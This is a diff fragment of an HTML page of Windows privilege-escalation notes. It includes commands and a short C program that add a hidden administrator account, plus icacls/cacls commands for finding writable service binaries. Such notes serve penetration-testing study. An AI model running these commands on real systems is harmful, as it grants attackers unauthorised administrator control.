+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user /add [username] [password]
+net localgroup administrators [username] /add
+</code></pre></div></div>
+<p>OR WITH binary</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include
+int main()
+{ int i;
+
+i = system(“net user /add ashoka qwerty”);
+i = system(“net localgroup administrators ashoka /add”);
+return 0;
+
+}
+</code></pre></div></div>
+<h4 id="-find-weak-permissions-via-cacls-or-icacls">| find weak permissions via Cacls or ICacls</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cacls “C:\Program Files” /T | findstr Users
+or
+icacls “C:\Program Files” /T | findstr Users
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls  "c:\program files\serviio\bin\serviioService.exe"
+</code></pre></div></div>
+
+<p> 
+ </p>
+<h1 id="anexo">anexo</h1>
+<p>based on : https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/</p>
+
+			</article>
+		</section>
+
+		<script>
+			document.getElementById("open-nav").addEventListener("click", function () {
+				document.body.classList.toggle("nav-open");
+			});
+		</script>
+	</body>
+</html>
